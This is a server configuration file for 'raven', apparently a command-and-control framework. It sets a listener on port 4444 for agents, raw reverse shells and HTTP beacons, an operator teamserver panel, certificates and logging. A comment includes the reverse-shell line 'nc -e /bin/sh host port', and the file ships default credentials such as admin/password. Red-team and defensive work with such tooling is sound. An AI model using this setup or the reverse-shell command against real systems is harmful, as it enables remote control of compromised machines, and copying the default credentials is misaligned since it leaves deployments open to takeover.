# -----------------------------------------------------------------------------
# raven  Framework > Server Configuration
# -----------------------------------------------------------------------------

# --  Listener --------------------------------------------------------------

# Bind address for the  TCP listener (agents connect here)
server.host=0.0.0.0

# TCP port agents connect to
server.port=4444

# Listener mode: multi | raw | tls | mtls | fmtls | http | https
#   multi  > accepts raw shells + raven agents + HTTP beacons (no TLS)
#   raw    > raw reverse shells only (nc -e /bin/sh host port)
#   tls    > raven agent over TLS, no client cert
#   mtls   > raven agent over mTLS, client cert required (recommended)
#   fmtls  > full mTLS on TCP + HTTPS beacon
#   http   > HTTP beacon only
#   https  > HTTPS beacon only
server.mode=multi

# -- Web Panel (WebApp mode) ---------------------------------------------------

# Bind address for the web panel HTTP server
web.host=0.0.0.0

# Port for the web panel (WebApp mode: -W / --web-mode)
web.port=5000

# HTTP beacon port for multi/fmtls mode (-1 = disabled)
web.beacon.port=-1

# -- TeamServer Web Panel ------------------------------------------------------

# Port for the TeamServer web panel (-TS / --teamserver)
# TeamServer requires operator login (default: admin / admin)
teamserver.port=5001

# -- Interface / Launch Mode ---------------------------------------------------

# Default interface when no flag is given on CLI:
#   web          > web panel, no auth  (-W)
#   teamserver   > web panel with auth (-TS)
#   cli          > terminal, no auth   (-C)
#   cli-teamserver > terminal with login (--cli-ts)
#   gui          > JavaFX GUI, no auth (-G)
#   gui-teamserver > JavaFX GUI with login (--gui-ts)
mode.interface=cli

# -- TLS / mTLS Certificates ---------------------------------------------------

# Run  java -jar raven.jar --init-certs  to generate these.
cert.keystore.path=certs/server.p12
cert.keystore.password=raven
cert.truststore.path=certs/truststore.jks
cert.ca.path=certs/ca.p12
cert.ca.password=raven
cert.agent.dir=certs/agents

# Minimum TLS version: TLSv1.2 or TLSv1.3
cert.tls.protocol=TLSv1.3

# Agent cert validity in days
cert.agent.validity.days=90

# -- Database ------------------------------------------------------------------

# DB backend: sqlite | postgresql | mongodb | none
#   sqlite     > local file DB, zero setup required (recommended)
#   postgresql > requires running PostgreSQL server
#   mongodb    > requires running MongoDB server
#   none       > in-memory only, data lost on restart
db.type=none

# Path for SQLite database file (relative to project root)
db.path=Database

# PostgreSQL connection (only used when db.type=postgresql)
db.url=jdbc:postgresql://localhost:5432/raven
db.name=raven
db.user=raven
db.password=raven

# MongoDB connection (only used when db.type=mongodb)
db.mongo.uri=mongodb://localhost:27017
db.mongo.name=raven

# -- Agent / Session -----------------------------------------------------------

# Command response timeout in milliseconds
agent.command.timeout=120000

# Initial connection/handshake timeout in milliseconds
agent.connection.timeout=10000

# Socket read buffer size in bytes
agent.buffer.size=8192

# -- Logging -------------------------------------------------------------------

# Log level: INFO | DEBUG | VERBOSE | WARN | ERROR
logging.level=INFO

# Enable verbose output (same as VERBOSE level)
logging.verbose=false

# Write logs to a file
logging.file.enabled=true
logging.file.path=logs/raven.log

# Max log entries kept in memory (for web/teamserver panel)
logging.max.entries=1000

# Chat & Logging
logging.operator.chat=true
logging.operator.chat.limit=500
logging.command.history=true
logging.command.history.limit=1000

# -- Default Admin Credentials ------------------------------------------------
# Change these before deploying. Stored here so no code changes are needed.
admin.username=admin
admin.password=password
admin.role=SUPER
